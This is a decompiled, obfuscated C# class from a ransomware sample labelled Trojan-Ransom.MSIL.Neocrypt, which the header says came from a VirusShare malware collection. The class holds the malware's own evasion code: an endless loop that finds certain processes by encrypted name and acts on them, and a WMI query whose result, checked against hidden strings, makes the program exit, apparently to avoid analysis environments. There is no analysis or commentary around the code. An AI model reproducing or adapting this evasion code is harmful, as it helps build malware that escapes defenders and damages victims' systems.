// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Output, Version=1.1.0.0, Culture=neutral, PublicKeyToken=679946a7cf437fcb
// MVID: 86897229-7BC6-4141-B9B1-66C325C24A9D
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.MSIL.Neocrypt.d-9ac5e14466821854f24f31402e9e3cdf97e476fcd0edf111aab0d7189ab5e577.exe

using \u0002;
using \u0003;
using System;
using System.Diagnostics;
using System.Management;

namespace \u0002
{
  internal class \u0004
  {
    [NonSerialized]
    internal static \u0006 \u0019;

    public static unsafe void \u0001()
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(8);
      while (true)
      {
        Process[] processArray1 = \u0012.\u009C(\u0004.\u0019(416));
        *(int*) voidPtr = 0;
        while (*(int*) voidPtr < processArray1.Length)
        {
          Process process = processArray1[*(int*) voidPtr];
          \u0013.\u007E\u009D((object) process);
          *(int*) voidPtr = checked (*(int*) voidPtr + 1);
        }
        Process[] processArray2 = \u0012.\u009C(\u0004.\u0019(429));
        *(int*) ((IntPtr) voidPtr + 4) = 0;
        while (*(int*) ((IntPtr) voidPtr + 4) < processArray2.Length)
        {
          Process process = processArray2[*(int*) ((IntPtr) voidPtr + 4)];
          \u0013.\u007E\u009D((object) process);
          *(int*) ((IntPtr) voidPtr + 4) = checked (*(int*) unchecked ((IntPtr) voidPtr + 4) + 1);
        }
        \u0014.\u0018\u0002(100);
      }
    }

    public static void \u0002()
    {
      if (\u0015.\u001A\u0002(\u0004.\u0001(), \u0004.\u0019(442), false) == 0)
      {
        \u0014.\u0019\u0002(0);
        if (true)
          return;
        goto label_11;
      }
      else if (\u0016.\u007E\u001B\u0002((object) \u0004.\u0001(), \u0004.\u0019(475)))
      {
        if (false)
          return;
        if (true)
        {
          \u0014.\u0019\u0002(0);
          return;
        }
        goto label_11;
      }
      else
      {
        int num1 = \u0015.\u001A\u0002(\u0004.\u0001(), \u0004.\u0019(484), false);
        int num2;
        if (true)
        {
          if (num1 != 0)
          {
            int num3 = \u0015.\u001A\u0002(\u0004.\u0001(), \u0004.\u0019(521), false);
            int num4 = 0;
            if (num4 == 0)
            {
              num1 = num3 == num4 ? 1 : 0;
            }
            else
            {
              num2 = num4;
              num1 = num3;
              goto label_16;
            }
          }
          else
            goto label_10;
        }
        num2 = \u0015.\u001A\u0002(\u0004.\u0001(), \u0004.\u0019(558), false) == 0 ? 1 : 0;
label_16:
        if ((num1 | num2) == 0)
          return;
        \u0014.\u0019\u0002(0);
        return;
      }
label_10:
      \u0014.\u0019\u0002(0);
label_11:
      if (false)
        goto label_10;
    }

    public static string \u0001()
    {
      ManagementObjectSearcher managementObjectSearcher1;
      if (true)
      {
        if (true)
        {
          ManagementObjectSearcher managementObjectSearcher2 = new ManagementObjectSearcher(\u0004.\u0019(575), \u0004.\u0019(592));
          if (true)
            managementObjectSearcher1 = managementObjectSearcher2;
        }
        else
          goto label_10;
      }
label_3:
      string str1 = string.Empty;
      ManagementObjectCollection.ManagementObjectEnumerator objectEnumerator;
      try
      {
        objectEnumerator = \u0018.\u007E\u001D\u0002((object) \u0017.\u007E\u001C\u0002((object) managementObjectSearcher1));
        if (true)
          goto label_6;
label_5:
        ManagementObject managementObject = (ManagementObject) \u0019.\u007E\u001E\u0002((object) objectEnumerator);
        str1 = \u001B.\u0080\u0002(\u0008.\u0088(\u001A.\u007E\u001F\u0002((object) managementObject, \u0004.\u0019(641))));
label_6:
        if (\u0004.\u007E\u0005((object) objectEnumerator))
          goto label_5;
      }
      finally
      {
        if (objectEnumerator != null)
          \u0013.\u007E\u009E((object) objectEnumerator);
      }
label_10:
      string str2 = str1;
      if (true)
        return str2;
      goto label_3;
    }

    static \u0004() => \u0007.\u0001(typeof (\u0004));
  }
}
